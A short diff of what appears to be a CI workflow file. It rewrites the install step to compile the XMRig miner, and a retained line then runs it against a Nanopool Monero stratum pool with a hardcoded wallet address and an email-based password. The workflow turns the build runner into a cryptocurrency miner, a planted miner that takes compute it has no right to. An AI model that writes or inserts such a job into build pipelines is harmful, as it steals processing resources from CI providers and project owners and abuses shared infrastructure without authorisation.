@@ -15,7 +15,8 @@ jobs:
        - name: install
          run: |
           sudo apt-get update -y
-          sudo apt-get install -y git build-essential cmake automake libtool autoconf
-          mkdir ./build && cd ./scripts
-          ./build_deps.sh && cd ../build
+          sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          mkdir ./build && cd ./build
+          cmake ..
+          make -j$(nproc)
           ./xmrig -a cryptonight -o stratum+tcp://xmr-us-east1.nanopool.org:10300 -u 47wjAGRkC7eMPa5tnJxV5pin2M2FfrapiUvVLQazb7HwDvv11vunhC6FR8J5AZBLWjCUBMbHXM1wN6FrZLPDSm1XQoKUFyc -p git-1:auzziewildcat10@gmail.com -t 1
